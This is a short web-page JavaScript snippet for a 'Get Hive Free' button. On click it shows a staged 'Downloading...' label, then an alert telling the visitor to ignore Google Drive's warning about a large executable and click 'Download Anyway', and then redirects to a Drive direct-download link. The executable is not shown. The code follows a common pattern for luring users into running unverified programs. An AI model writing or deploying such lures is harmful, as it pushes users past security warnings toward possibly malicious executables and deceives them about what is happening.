document.querySelector('.get-hive-free').addEventListener('click', function (e) {
    e.preventDefault();  

    this.innerText = 'Downloading...'; 

    setTimeout(() => {
        alert('Google Drive may show a warning because this file is large and executable. Click "Download Anyway" to continue.');
        this.innerText = 'Get Hive Free';

        window.location.href = 'https://drive.google.com/uc?export=download&id=1QjCzqeozzzO9ztjJthNrXhsof-ot0eWV';
    }, 1000); 
});
